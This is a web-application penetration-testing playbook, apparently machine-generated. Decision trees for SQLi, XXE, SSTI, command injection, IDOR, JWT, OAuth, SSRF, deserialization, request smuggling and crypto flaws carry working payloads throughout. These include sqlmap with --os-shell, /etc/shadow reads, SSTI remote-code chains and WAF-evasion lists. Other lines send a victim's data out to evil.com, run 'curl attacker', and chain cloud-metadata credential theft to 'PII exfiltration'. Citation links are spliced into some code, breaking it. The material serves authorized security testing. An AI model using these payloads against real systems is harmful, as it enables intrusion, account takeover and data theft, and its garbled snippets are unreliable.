# Web Application Vulnerability Identification Framework & Execution Playbook

***

## Prerequisites & Environment Setup

### Directory Structure
```
/vulns/<target>/
├── burp/
│   ├── project.burp
│   ├── scan-configs/
│   └── extensions/
├── recon/
│   ├── subdomains.txt
│   ├── endpoints.txt
│   ├── js-files.txt
│   └── params.txt
├── payloads/
│   ├── sqli/
│   ├── xss/
│   ├── ssti/
│   ├── ssrf/
│   └── custom/
├── evidence/
│   ├── screenshots/
│   ├── http-logs/
│   └── poc-scripts/
└── reports/
    ├── draft.md
    └── final/
```

### Toolstack
| Category | Tools |
|---|---|
| Proxy/Interception | Burp Suite Pro, mitmproxy |
| Recon | Amass, Subfinder, httpx, gau, waybackurls, katana |
| Fuzzing | ffuf, feroxbuster, wfuzz |
| Injection | sqlmap, dalfox (XSS), tplmap (SSTI), commix (CMDi) |
| API | Postman, Arjun, kiterunner, graphql-cop |
| OOB Detection | interactsh-client, Burp Collaborator |
| Deserialization | ysoserial, PHPGGC, gadgetinspector |
| Scripting | Python 3.11+, httpx lib, requests, pwntools |
| JWT | jwt_tool, jwt-cracker |
| Smuggling | smuggler.py, h2csmuggler |
| Prototype Pollution | ppmap, dom-invader (Burp) |

### Proxy & CA Setup
```bash
# Global proxy config
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080

# Install Burp CA system-wide (Ubuntu/Kali)
curl -sk http://127.0.0.1:8080/cert -o burp-ca.der
openssl x509 -inform DER -in burp-ca.der -out burp-ca.crt
sudo cp burp-ca.crt /usr/local/share/ca-certificates/
sudo update-ca-certificates

# Firefox: about:preferences -> Certificates -> Import burp-ca.crt
# Mobile: Push via ADB and install under Settings > Security > CA Cert
```

### Session Management
- Use Burp's **Session Handling Rules** with macro-based CSRF token refresh
- Install **Token Extractor** extension to auto-rotate bearer tokens per-request
- Configure **AuthMatrix** extension for multi-role privilege mapping
- Maintain separate Burp projects per role: `admin.burp`, `user.burp`, `guest.burp`

***

## Injection (SQLi, XXE, SSTI, Command Injection)

### SQL Injection

- `->` **[Primary Probe]** Run `sqlmap -u "https://target/api/item?id=1" --headers="Authorization: Bearer <tok>" --level=5 --risk=3 --batch --random-agent --dbs` against all integer/UUID params captured in Burp history [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)
  - `->` **[Signal: Error-based response / time delay]** → Confirm with `--technique=BEUSTQ`, dump schema with `--tables`, escalate to `--os-shell` if MySQL + FILE privilege
  - `->` **[Dead End: WAF blocks union/error payloads]** → Try `--tamper=charunicodeescape,between,space2comment` — inline comment bypass: `SELECT/**/1`; hex-encode strings: `0x61646d696e`
  - `->` **[Dead End: Numeric param hardened]** → Pivot to JSON body: `{"id": "1 OR SLEEP(5)--"}` — many ORMs pass JSON fields unsanitized to raw queries [ijmir](https://www.ijmir.com/v2i6/2.php)
  - `->` **[Dead End: No async response timing]** → Force second-order: register username `admin'--` → trigger profile-fetch endpoint → observe DB error on downstream query
  - `->` **[Data Chaining]** Leaked `db_user` with FILE priv → attempt `/etc/passwd` read → leaked hostname → new SSRF target

### XXE (XML External Entity)

- `->` **[Primary Probe]** Intercept any XML-body request (SOAP, file-upload parsers, RSS import). Inject:
  ```xml
  <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
  ```
  - `->` **[Signal: File contents echoed]** → Escalate to `file:///proc/self/environ`, `/proc/net/fib_trie` for internal IPs
  - `->` **[Dead End: No inline echo]** → Blind XXE via OOB: `<!ENTITY % dtd SYSTEM "http://<interactsh-host>/x.dtd">` — capture DNS/HTTP ping via interactsh-client [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11012433/)
  - `->` **[Dead End: External entities disabled]** → Try XInclude: `<xi:include href="file:///etc/passwd"/>` in any nested XML element; also test SVG upload (`<svg><image href="file:///etc/shadow"/></svg>`)
  - `->` **[Dead End: Parser rejects external]** → Error-based XXE: craft malformed DTD to trigger descriptive exception leaking path info
  - `->` **[Data Chaining]** OOB DNS confirms parser reachability → exfiltrate `/etc/hosts` → discover internal hostnames → seed SSRF attack surface

### SSTI (Server-Side Template Injection)

- `->` **[Primary Probe]** Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` into all user-controlled reflection points (name fields, email subject, PDF generators, error messages)
  - `->` **[Signal: `49` reflected]** → Engine fingerprint via `tplmap -u "https://target/page?name=INJECT"` → RCE chain per engine:
    - Jinja2: `{{''.__class__.__mro__ [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/).__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}`
    - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
    - Pebble: `{% for i in range(0, 1) %}{{i.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(...)}}{% endfor %}`
  - `->` **[Dead End: Math not evaluated]** → Try logic operators: `{{'a'*10}}`, Smarty: `{php}echo `id`;{/php}`, Mako: `${self.module.cache.util.os.system('id')}`
  - `->` **[Dead End: WAF blocks curly braces]** → Unicode brace variants: `\u007b\u007b7*7\u007d\u007d`; try encoding through URL, base64 decode gadget in template
  - `->` **[Data Chaining]** Confirmed SSTI RCE → read AWS metadata from `169.254.169.254` → IAM role creds → escalate to S3 bucket enumeration

### Command Injection

- `->` **[Primary Probe]** Inject `; id`, `` `id` ``, `$(id)`, `| id` into filename params, ping/traceroute fields, image conversion inputs, report generators
  - `->` **[Signal: `uid=` in response]** → Escalate: `$(curl http://<interactsh>/$(whoami))` for blind OOB
  - `->` **[Dead End: Semicolon/pipe blocked]** → Try newline injection: `%0aid`, `%0a%0did`; IFS bypass: `i$IFS}d`
  - `->` **[Dead End: All special chars stripped]** → Encoded polyglot: `1%26%26id%261` (URL double-encode), or chain via file write: write cron payload via unrestricted upload then trigger
  - `->` **[Dead End: Async process — no output]** → DNS OOB: `` `host $(id).attacker.interactsh.com` `` captured via interactsh-client [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11376817/)

***

## Broken Access Control (IDOR, Privilege Escalation, CORS)

### IDOR (Insecure Direct Object Reference)

- `->` **[Primary Probe]** Enumerate all numeric/UUID object references in path (`/api/users/1234`) and body params; use Burp Intruder with `Authz` extension to replay requests under different session cookies [infosecwriteups](https://infosecwriteups.com/how-i-uncover-an-idor-led-to-access-private-cv-access-3ff5be987896)
  - `->` **[Signal: Cross-account data returned]** → Confirm with `diff` of two account responses; escalate to write operations (PUT/DELETE with victim ID)
  - `->` **[Dead End: Opaque UUIDs]** → Harvest other users' UUIDs from public activity feeds, email headers (`X-User-Id`), API error messages, JS variable dumps
  - `->` **[Dead End: Request returns 403]** → Second-order IDOR: set victim UUID in benign field (profile picture URL, notification preference), trigger indirect access endpoint
  - `->` **[Dead End: Response identical regardless of ID]** → Mass-enumerate with ffuf: `ffuf -u https://target/api/doc/FUZZ -w ids.txt -H "Cookie: victim_sess" -mc 200` — compare content length
  - `->` **[Data Chaining]** Leaked admin UUID → use in privilege escalation endpoint → `PATCH /api/users/<admin-uuid>/role` with `{"role":"admin"}`

### Privilege Escalation / Mass Assignment

- `->` **[Primary Probe]** Capture account-update request; add undocumented keys via JSON fuzzing: `{"role":"admin","isAdmin":true,"plan":"enterprise","credits":9999}` [strobes](https://strobes.co/blog/web-application-penetration-testing-tools/)
  - `->` **[Signal: Role/attribute silently promoted]** → Confirm by re-fetching profile; escalate to sensitive function access
  - `->` **[Dead End: Unknown keys rejected]** → Source-mine JS bundles: `grep -Eo '"[a-zA-Z_]+"' app.js | sort -u > keys.txt` → replay with discovered internal keys
  - `->` **[Dead End: API strictly validates schema]** → Try HTTP method override: add `X-HTTP-Method-Override: PATCH` on a POST request to a read-only endpoint

### CORS Misconfiguration

- `->` **[Primary Probe]** Add `Origin: https://evil.com` header to all authenticated API requests; check response for `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)
  - `->` **[Signal: Reflected origin with credentials]** → PoC XS-leak JS:
    ```javascript
    fetch('https://target/api/me',{credentials:'include'})
    .then(r=>r.json()).then(d=>fetch('https://evil.com/?d='+btoa(JSON.stringify(d))))
    ```
  - `->` **[Dead End: Whitelist enforced]** → Try null origin: `Origin: null` (sandboxed iframe trick), subdomain variations: `Origin: https://target.evil.com`
  - `->` **[Dead End: Credentials not forwarded]** → CORS without credentials still exposes internal API structure, internal hostnames, non-public data with predictable non-sensitive leakage chaining to info disclosure
  - `->` **[Data Chaining]** CORS leak exposes internal API hostname → new SSRF probe target

***

## Authentication & Session Flaws

### JWT Attacks

- `->` **[Primary Probe]** Decode JWT (base64); inspect `alg` header field; run `jwt_tool <token> -M at` for all attack modes [xploitcore.hashnode](https://xploitcore.hashnode.dev/bug-bounty-guide-2025)
  - `->` **[Signal: `alg:none` accepted]** → Strip signature entirely: `eyJ...header_part.eyJ...payload_part.` (empty signature)
  - `->` **[Signal: RS256 → HS256 confusion]** → Sign token with HS256 using the server's **public key** as the HMAC secret: `jwt_tool <token> -X k -pk public.pem`
  - `->` **[Dead End: Algorithm hardened]** → JWK header injection: embed a crafted `jwk` object in token header pointing to attacker-controlled key; also test `jku`/`x5u` header with URL pointing to attacker-hosted JWKS
  - `->` **[Dead End: Signature always verified]** → Weak secret brute-force: `hashcat -a 0 -m 16500 token.jwt rockyou.txt`
  - `->` **[Dead End: Strong secret]** → Check `kid` parameter for path traversal: `"kid": "../../dev/null"` → HMAC with empty string secret
  - `->` **[Data Chaining]** Forged admin JWT → access admin API routes → trigger SSRF via admin-only webhook functionality

### OAuth / SSO Flaws

- `->` **[Primary Probe]** Capture authorization code flow; test `redirect_uri` for open redirect: append `%0a`, `//evil.com`, `..%2F..%2F`, `target.com.evil.com` [sprocketsecurity](https://www.sprocketsecurity.com/blog/pentesting-standards-2025)
  - `->` **[Signal: Code redirected to attacker URL]** → Steal authorization code → exchange for access token
  - `->` **[Dead End: redirect_uri pinned]** → Test `state` parameter CSRF: remove `state`, initiate flow, complete with victim session → account takeover
  - `->` **[Dead End: state validated]** → Check Referer header leakage: does auth code appear in `Referer` to third-party analytics scripts loaded on `/callback`?
  - `->` **[Dead End: No referer leakage]** → Token leakage via implicit flow fragment: inject `<img src=x>` on redirect page to leak `#access_token=` fragment via referrer policy misconfiguration

### Session Management

- `->` **[Primary Probe]** Analyze session token entropy: collect 100 tokens, run `echo <tok> | base64 -d | xxd` and measure uniqueness; test predictability with **Sequencer** in Burp
  - `->` **[Signal: Low entropy / sequential]** → Brute-force active sessions via Intruder with valid token prefix + incremented suffix
  - `->` **[Dead End: Tokens opaque/random]** → Test fixation: set `Cookie: session=attacker123` before login; if server accepts it post-auth → fixation
  - `->` **[Dead End: No fixation]** → Test session persistence after password reset and logout; look for non-httponly cookies readable via DOM XSS

***

## Business Logic Flaws

- `->` **[Primary Probe]** Map the full application workflow for multi-step processes (checkout, password reset, account upgrade); manually attempt to skip, reorder, or replay individual steps [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)
  - `->` **[Condition: Skip-step accepted]** → Escalate: access step N+2 without completing N+1 (e.g., confirm order without payment)
  - `->` **[Condition: Price manipulation]** → Intercept quantity/price fields:
    - Negative quantity: `{"qty": -1}` → negative charge / credit addition
    - Float truncation: `{"price": 0.001}` → rounds to 0 at payment
    - Currency mismatch: submit price in low-value currency when backend assumes USD
  - `->` **[Dead End: Server recalculates price server-side]** → Race condition: send concurrent requests to apply the same discount code simultaneously via Turbo Intruder `parallelism=50`
    ```
    engine.queue(target.req, gate='race'); [x50]; engine.openGate('race')
    ```
  - `->` **[Dead End: Race window too small]** → Apply Nagle's algorithm bypass: use HTTP/2 single-packet attack (all requests in one TCP segment)
  - `->` **[Data Chaining]** Duplicate coupon application → free credits → use credits to trigger premium SSRF-capable functionality

***

## Client-Side Attacks (XSS, CSRF, Prototype Pollution, Clickjacking)

### XSS (Reflected / Stored / DOM)

- `->` **[Primary Probe]** Inject `dalfox url "https://target/search?q=FUZZ" --cookie "session=X" --blind https://<interactsh>` across all reflection points [aress](https://www.aress.com/blog/read/20-best-web-application-penetration-testing-tools-in-2025)
  - `->` **[Signal: Payload fires in browser]** → Escalate to account takeover: exfiltrate cookies, forge authenticated requests, install persistent keylogger in DOM
  - `->` **[Dead End: HTML entities encoded]** → Test DOM-based XSS: grep JS source for sinks: `document.write`, `innerHTML`, `eval`, `location.href`; trace sources: `location.hash`, `document.referrer`, `postMessage`
  - `->` **[Dead End: CSP blocks inline execution]** → CSP bypass via JSONP endpoint: `<script src="/api/callback?cb=alert(1)">`, or use trusted CDN whitelisted in CSP (`angular.min.js` for `ng-app` injection)
  - `->` **[Dead End: Strict CSP with nonce]** → XSS via file upload (SVG): `<svg onload="alert(document.domain)"/>` served from same origin

**WAF Evasion Patterns:**
- Tag obfuscation: `<ScRiPt>`, `<img/src=x onerror=alert(1)>`
- JS comment injection: `</script><script>ale/**/rt(1)</script>`
- String concatenation: `'ale'+'rt'+'(1)'`
- Template literals: `` alert`1` ``
- HTML5 vectors: `<details open ontoggle=alert(1)>`

### CSRF

- `->` **[Primary Probe]** Remove `CSRF token` parameter from state-changing requests; replay in cross-origin context (use Burp CSRF PoC generator); observe if action executes [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)
  - `->` **[Signal: Action succeeds without token]** → Build PoC HTML form with `target="_blank"` for stealth delivery
  - `->` **[Dead End: Token validated]** → Test token-reuse: capture one valid token, use it twice; test same-site=Lax bypass via GET method state change; test token tied to session but not to action
  - `->` **[Dead End: SameSite=Strict cookies]** → CSRF via XSS: chain a stored XSS to extract and replay CSRF token programmatically

### Prototype Pollution

- `->` **[Primary Probe]** Use Burp DOM Invader with prototype pollution canary injection; also run `ppmap -u "https://target"` for automated gadget discovery [xploitcore.hashnode](https://xploitcore.hashnode.dev/bug-bounty-guide-2025)
  - `->` **[Signal: `__proto__[canary]=1` reflected or `Object.prototype.canary` truthy]** → Search for exploitable gadgets: `innerHTML`, `eval`, `fetch`, `document.write` consuming polluted properties
  - `->` **[Dead End: Client-side hardened]** → Test server-side prototype pollution in Node.js: send `{"__proto__":{"admin":true}}` in JSON body; or `constructor[prototype][admin]=true` in query params
  - `->` **[Dead End: No client gadgets found]** → Pollution via URL query string: `?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('curl attacker')//`

### Clickjacking

- `->` **[Primary Probe]** Check `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` headers; attempt to iframe target in a test HTML page
  - `->` **[Signal: Page frames successfully]** → Build UI overlay PoC targeting high-impact action (fund transfer, delete account)
  - `->` **[Dead End: `DENY` or `SAMEORIGIN` set]** → Test for partial-page framing via `object` or `embed` tags; check subdomains with looser frame policies

***

## SSRF & Internal Network Exposure

- `->` **[Primary Probe]** Identify all URL-accepting parameters (webhooks, avatar fetch, PDF renderer, integrations, export-to-PDF); inject `http://<interactsh-host>/ssrf-test`; monitor for DNS/HTTP ping [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11012433/)
  - `->` **[Signal: OOB HTTP ping received]** → Escalate: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDSv1), `http://metadata.google.internal/computeMetadata/v1/` (GCP), `http://100.100.100.200/latest/meta-data/` (Alibaba)
  - `->` **[Dead End: HTTP blocked, only DNS resolves]** → DNS rebinding: register domain that resolves to `127.0.0.1` after TTL expires; trigger re-fetch after bind
  - `->` **[Dead End: URL scheme restricted to https]** → Protocol smuggling: `https://attacker.com@169.254.169.254/` — test credential confusion parsing; try `http://[::ffff:169.254.169.254]/`
  - `->` **[Dead End: IP blocklist — loopback/link-local blocked]** → Bypass via redirects: host `302 → http://127.0.0.1:8080` on attacker server; also try decimal encoding `http://2130706433/`, octal `http://0177.0.0.1/`
  - `->` **[Dead End: Redirect following disabled]** → SSRF via DNS: `http://localtest.me/` (resolves to 127.0.0.1); `http://1.1.1.1.nip.io` variants
  - `->` **[Data Chaining]** IMDSv1 IAM creds → AWS CLI lateral movement → S3 bucket listing → PII exfiltration or EC2 instance takeover [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11415292/)

**Internal Port Scanning via SSRF:**
```bash
# One-liner: Generate SSRF port-scan payload list
for p in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do echo "http://127.0.0.1:$p/"; done > /vulns/target/payloads/ssrf-ports.txt
```

***

## Insecure Deserialization

- `->` **[Primary Probe]** Identify serialized object formats in cookies, hidden fields, API bodies:
  - Java: `rO0AB` (base64 of `\xAC\xED`)
  - PHP: `O:8:"stdClass":`
  - Python Pickle: `\x80\x02`
  - .NET: `AAEAAAD/////`
  - `->` **[Signal: Object structure confirmed]** → Generate gadget chains with `ysoserial.net` / `PHPGGC` / `ysoserial` (Java): `java -jar ysoserial.jar CommonsCollections6 "curl https://interactsh"` [ijmir](https://www.ijmir.com/v2i6/2.php)
  - `->` **[Dead End: Serialized object signature-verified]** → Look for secondary deserialization: objects stored server-side (session store, cache) and retrieved via controllable key
  - `->` **[Dead End: No known gadget chains]** → Fuzzing: corrupt byte positions in serialized blob; observe if different exception classes leak in errors — different classes = different gadget candidates
  - `->` **[Dead End: Black-box only]** → OOB confirmation: embed DNS lookup gadget; monitor interactsh for callback confirming deserialization execution path [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11376817/)

**Script Definition Block — Java Gadget Automation:**
- **Input:** Base64-encoded Java serialized token from HTTP response
- **Core Logic:**
  1. Decode token, detect magic bytes `0xACED`
  2. Iterate through `ysoserial` gadget list: `CommonsCollections1–7`, `Spring1`, `Groovy1`
  3. For each: generate payload with OOB callback command
  4. Re-encode, inject into original request, fire via Burp Repeater
  5. Monitor interactsh for which gadget triggers DNS callback
- **Dependencies:** Java 8 runtime, ysoserial.jar, interactsh-client
- **Expected Output:** Gadget name + confirmed OOB callback + exploitable request template

***

## API-Specific Vulnerabilities

### REST API

- `->` **[Primary Probe]** Run `kiterunner scan https://target/api -w routes-large.kite --max-connection-timeout 3` to bruteforce undocumented endpoints [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11012433/)
  - `->` **[Signal: Undocumented 200/201 endpoints]** → Fuzz with Arjun: `arjun -u https://target/api/internal/admin -m POST` to discover hidden params
  - `->` **[Dead End: All endpoints 401]** → Test unauthenticated verb tampering: `HEAD`/`OPTIONS` may bypass auth middleware; `TRACE` method may reflect headers
  - `->` **[Dead End: Strict verb enforcement]** → HTTP parameter pollution: `?user_id=attacker&user_id=victim` — which value does backend consume?

### GraphQL

- `->` **[Primary Probe]** Test introspection: `{"query":"{__schema{types{name,fields{name}}}}"}` [zeropath](https://zeropath.com/blog/cve-2025-10004-gitlab-graphql-dos-summary)
  - `->` **[Signal: Schema returned]** → Map all queries/mutations; identify sensitive operations (deleteUser, updateRole, readPrivateMessage); test with manipulated auth context
  - `->` **[Dead End: Introspection disabled]** → Field suggestion attack: intentionally misspell fields (`usr` → server suggests `user`); enumerate schema by suggestions
  - `->` **[Dead End: No suggestions]** → Wordlist-based field fuzzing: `ffuf -u https://target/graphql -X POST -d '{"query":"{FUZZ}"}' -w graphql-fields.txt`
  - `->` **[Dead End: All queries blocked]** → Batching abuse: `[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]` — may bypass per-request rate limiting
  - `->` **[Data Chaining]** GraphQL IDOR on private messages → extract admin email → use in password reset CSRF → account takeover

### HTTP Request Smuggling

- `->` **[Primary Probe]** Run `smuggler.py -u https://target/ -l` to detect CL.TE and TE.CL desync vulnerabilities [sentinelone](https://www.sentinelone.com/vulnerability-database/cve-2025-22871/)
  - `->` **[Signal: CL.TE confirmed]** → Craft prefix to poison next victim's request:
    ```
    POST / HTTP/1.1
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    G
    ```
  - `->` **[Dead End: Standard smuggling blocked]** → Test H2.CL / H2.TE (HTTP/2 downgrade smuggling) using `h2csmuggler`: HTTP/2 front-end + HTTP/1.1 back-end with conflicting Content-Length
  - `->` **[Dead End: HTTP/2 not supported]** → Header injection via CRLF in HTTP/1.1 path: `GET /%0d%0aX-Forwarded-For:%20127.0.0.1 HTTP/1.1`
  - `->` **[Data Chaining]** Smuggling prefix to internal admin interface → bypass IP allowlist → trigger admin-only SSRF or file-read endpoint [sentinelone](https://www.sentinelone.com/vulnerability-database/cve-2025-22871/)

***

## Cryptographic Weaknesses

- `->` **[Primary Probe]** Inspect all tokens, cookies, and encrypted values for static IV, ECB mode patterns, or predictable structure; check if same plaintext always produces same ciphertext (ECB indicator) [ijircst](https://www.ijircst.org/view_abstract.php?title=Design-and-Implementation-of-an-Enhanced-Web-Application-Vulnerability-Scanner&year=2025&vol=13&primary=QVJULTEzNjI=)
  - `->` **[Signal: ECB mode]** → Byte-at-a-time decryption: craft inputs to leak one byte per request; or block rearrangement for role escalation in encrypted cookies
  - `->` **[Dead End: CBC mode]** → CBC bit-flipping: flip bits in ciphertext to modify specific plaintext fields (e.g., `user=attacker` → `user=admin\x00\x00\x00`)
  - `->` **[Dead End: Authenticated encryption (GCM)]** → Test nonce reuse: collect multiple ciphertexts, XOR nonce-reused ciphertexts to recover keystream
  - `->` **[Dead End: Proper AEAD]** → Padding oracle attack via side-channel: measure response time or error message differences for CBC-encrypted tokens (`PKCS7` padding)
  - `->` **[Condition: Weak PRNG for token generation]** → Collect 50+ tokens, run through `php_mt_seed` or custom predictor to derive seed and forecast future tokens

**One-liner — Detect Repeated Ciphertext Blocks (ECB Oracle):**
```bash
python3 -c "import sys,base64; c=base64.b64decode(sys.argv [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)); blks=[c[i:i+16] for i in range(0,len(c),16)]; print('ECB DETECTED' if len(blks)!=len(set(blks)) else 'Likely CBC')" "<cookie_value>"
```

***

## Misconfiguration & Information Disclosure

- `->` **[Primary Probe]** Run `nuclei -u https://target -t exposures/ -t misconfiguration/ -t technologies/ -severity medium,high,critical -o /vulns/target/reports/nuclei.txt` [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11415292/)
  - `->` **[Signal: `.git` exposed]** → `git-dumper https://target/.git/ ./dumped-repo` → reconstruct source → find hardcoded creds, internal endpoints, business logic
  - `->` **[Signal: Swagger/OpenAPI exposed]** → Import into Postman → enumerate all API routes → fuzz undocumented params with Arjun
  - `->` **[Dead End: Common paths return 404]** → JS recon pipeline:
    ```bash
    gau https://target | grep "\.js$" | httpx -mc 200 | tee js-files.txt
    cat js-files.txt | xargs -I{} sh -c 'curl -sk "{}" | grep -Eo "(api|/v[0-9]+|/internal|secret|token|key)[^\"]*"'
    ```
  - `->` **[Dead End: JS minified / no leaks]** → Check error handling: send malformed requests (invalid JSON, wrong content-type, oversized headers) to trigger stack traces leaking framework version, internal paths, DB connection strings
  - `->` **[Dead End: Generic error pages]** → Infrastructure recon: `nmap -sV -p 80,443,8080,8443,9200,6379,5432,27017 <target-IP>` → identify default service pages, exposed admin panels (Kibana `:5601`, Redis `:6379` unauthenticated)
  - `->` **[Dead End: All ports filtered]** → Subdomain takeover check: `subfinder -d target.com | httpx -mc 404 | nuclei -t takeovers/` — dangling CNAMEs pointing to deprovisioned cloud services (S3, GitHub Pages, Heroku)

**Script Definition Block — Secrets Harvesting from JS:**
- **Input:** List of JS URLs from `gau`/`waybackurls`
- **Core Logic:**
  1. Fetch each JS file with rotating User-Agent
  2. Apply regex patterns: API keys (`[a-zA-Z0-9]{32,45}`), JWTs (`eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+`), AWS keys (`AKIA[A-Z0-9]{16}`), private keys (`-----BEGIN RSA`)
  3. Deduplicate and classify by pattern type
  4. Validate discovered API keys against their respective services (AWS STS, Stripe `/v1/charges`, etc.)
- **Dependencies:** Python `re`, `requests`, `httpx`, `trufflehog` (secondary validation)
- **Expected Output:** `secrets.csv` with columns: `source_url`, `secret_type`, `value`, `validity_status`

***

## Cross-Class Data Chaining Map

```
JS Recon (secrets) ──────────────────────────────► API Auth Bypass
     │                                                     │
     ▼                                                     ▼
SSRF (IMDSv1 creds) ────────────────────────────► AWS Lateral Movement
     │
     ▼
Internal hostname leak ──► New IDOR surface ──► Privilege Escalation
     │
     ▼
GraphQL Introspection ──► Admin mutation ──► RCE via file upload
     │
     ▼
JWT kid traversal ──► Algorithm confusion ──► Auth bypass ──► Business Logic
```

Every finding should be triaged through this chain — a low-severity information leak from JS files or a headers-based hostname disclosure frequently unlocks critical-severity vulnerabilities when cross-class chaining is applied methodically. [sprocketsecurity](https://www.sprocketsecurity.com/blog/pentesting-standards-2025)